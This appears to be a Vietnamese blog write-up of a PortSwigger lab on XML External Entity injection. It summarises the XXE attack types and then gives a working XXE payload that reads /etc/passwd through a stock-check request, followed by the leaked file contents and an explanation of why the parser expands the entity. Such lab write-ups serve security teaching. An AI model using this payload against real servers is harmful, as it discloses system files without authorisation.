---
title: "[PortSwigger Lab] - XML External Entity Injection (XXE)"
description: Solution of XML External Entity Injection (XXE) Lab
date: 2025-06-10 17:18:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, xxe]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-10-portswigger-lab-xxe/xxe.png
    alt: XML External Entity Injection (XXE)
---

## Introduction
---
### **XML External Entity Injection (XXE)**
**XML External Entity Injection (XXE)** là một lỗ hổng bảo mật trên web xảy ra khi một ứng dụng xử lý dữ liệu **XML** mà không cấu hình đúng cách trình phân tích cú pháp **XML (XML parser)**. Điều này cho phép kẻ tấn công chèn và thực thi các thực thể bên ngoài **(external entities)** độc hại vào dữ liệu **XML**.

### Types of XXE attacks

| **Loại tấn công**                              | **Mô tả**                                                                                                                              |
| ---------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| **XXE đọc file nội bộ (File Disclosure)**      | Đọc nội dung các file nhạy cảm trên hệ thống máy chủ, ví dụ: `/etc/passwd`, cấu hình ứng dụng, key bí mật,...                          |
| **XXE gây SSRF (Server-Side Request Forgery)** | Gửi yêu cầu từ máy chủ đến các địa chỉ nội bộ hoặc dịch vụ khác mà máy chủ có thể truy cập (VD: `http://localhost:8000/internal-api`). |
| **Blind XXE - Exfiltration qua kênh phụ**      | Dữ liệu không hiển thị trực tiếp trong phản hồi, nhưng được gửi âm thầm đến máy chủ do kẻ tấn công kiểm soát thông qua HTTP, FTP,...   |
| **Blind XXE - Rò rỉ dữ liệu qua lỗi**          | Gây ra lỗi trong quá trình phân tích XML, khiến dữ liệu nhạy cảm bị rò rỉ qua thông báo lỗi trả về từ ứng dụng.                        |

## Solve **XML External Entity Injection (XXE)** Lab
---
### Lab: Exploiting XXE using external entities to retrieve files
#### Exploit
- Đến 1 blog bất kỳ và sử dụng chức năng **check stock**
- Gửi request **check stock** đến **Repeater**
- Thay đổi payload thành

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
	<!ENTITY xxe SYSTEM "/etc/passwd">
]>
<stockCheck>
    <productId>1;&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```
- Ta nhận được nội dung của `/etc/passwd`

```text
"Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```
#### How it work?
- Ứng dụng nhận request
- **XML Parser** tìm thấy dòng `<!DOCTYPE foo ...>` nên bật chế độ **Document Type Definition (DTD)** — định nghĩa cấu trúc của tài liệu XML
- Gặp khai báo `<!ENTITY xxe SYSTEM "/etc/passwd">` nên đi tải tệp `/etc/passwd` từ chính server gán cho thực thể `xxe`. 
- Sau đó, khi parser thấy chuỗi `&xxe;` bên trong `<productId>`, nó thay thế token đó bằng nội dung tệp vừa đọc.
- XML sau khi mở rộng entity: **Parser** tạo ra tài liệu nội bộ: xml 

```xml
<stockCheck>
    <productId>1;root:x:0:0:root:/root:/bin/bash …</productId> <storeId>1</storeId> 
</stockCheck>
```
- `Framework` cố map `<productId>` vào thuộc tính **int** productId hoặc **Long** productId của class `StockCheckRequest`.
- Chuyển đổi chuỗi `"1;root:x:0:0:..."` sang số nguyên thất bại => ứng dụng trả lỗi là nội dung chuyển đổi về cho người dùng


---
Goodluck! 🍀🍀🍀 